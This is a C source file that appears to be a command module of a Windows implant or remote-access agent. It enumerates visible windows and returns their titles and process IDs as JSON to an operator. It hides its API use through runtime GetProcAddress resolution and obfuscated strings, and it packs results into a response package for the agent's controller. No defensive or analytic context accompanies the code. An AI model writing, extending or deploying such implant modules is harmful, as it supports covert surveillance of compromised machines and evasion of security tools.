#include "config.h"
#ifdef INCLUDE_CMD_WINDOWLIST

#include "commands.h"
#include "json_out.h"

typedef BOOL  (WINAPI *fn_EnumWindows_t)(BOOL (CALLBACK*)(void*, void*), void*);
typedef BOOL  (WINAPI *fn_IsWindowVisible_t)(void*);
typedef int   (WINAPI *fn_GetWindowTextA_t)(void*, char*, int);
typedef DWORD (WINAPI *fn_GetWindowThreadProcessId_t)(void*, DWORD*);

static struct WIN_INFO { DWORD pid; char title[256]; } wins[256];
static DWORD win_count = 0;
static fn_GetWindowThreadProcessId_t g_GetPid = NULL;
static fn_GetWindowTextA_t g_GetText = NULL;
static fn_IsWindowVisible_t g_IsVis = NULL;
static PINSTANCE g_pinst = NULL;

static BOOL CALLBACK enum_cb(void* hwnd, void* param) {
    if (win_count >= 256 || !g_GetPid || !g_GetText || !g_IsVis) return FALSE;
    if (!g_IsVis(hwnd)) return TRUE;
    char buf[256] = {0};
    g_GetText(hwnd, buf, 255);
    if (buf[0] == 0) return TRUE;
    DWORD pid = 0;
    g_GetPid(hwnd, &pid);
    if (win_count < 256) {
        wins[win_count].pid = pid;
        int k = 0;
        for (; buf[k] && k < 255; k++) wins[win_count].title[k] = buf[k];
        wins[win_count].title[k] = 0;
        win_count++;
    }
    return TRUE;
}

VOID cmd_windowlist(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_user, "user32.dll");
    HMODULE h_user = inst->Win32.LoadLibraryA(_user);
    if (!h_user) {
        package_add_string(inst, response, XSTR("user32 load failed"));
        response->is_error = TRUE;
        return;
    }
    g_GetPid = (fn_GetWindowThreadProcessId_t)(void*)inst->Win32.GetProcAddress(h_user, "GetWindowThreadProcessId");
    g_GetText = (fn_GetWindowTextA_t)(void*)inst->Win32.GetProcAddress(h_user, "GetWindowTextA");
    g_IsVis = (fn_IsWindowVisible_t)(void*)inst->Win32.GetProcAddress(h_user, "IsWindowVisible");
    if (!g_GetPid || !g_GetText || !g_IsVis) {
        package_add_string(inst, response, XSTR("user32 resolve failed"));
        response->is_error = TRUE;
        return;
    }
    g_pinst = inst;
    win_count = 0;

    fn_EnumWindows_t pEnum = (fn_EnumWindows_t)(void*)inst->Win32.GetProcAddress(h_user, "EnumWindows");
    if (!pEnum) {
        package_add_string(inst, response, XSTR("EnumWindows resolve failed"));
        response->is_error = TRUE;
        return;
    }
    pEnum(enum_cb, NULL);

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"windows\":[");
    for (DWORD i = 0; i < win_count; i++) {
        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"pid\":");
        j_append_uint(&jb, wins[i].pid);
        j_append_raw(&jb, ",\"title\":");
        j_append_str(&jb, wins[i].title);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, win_count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
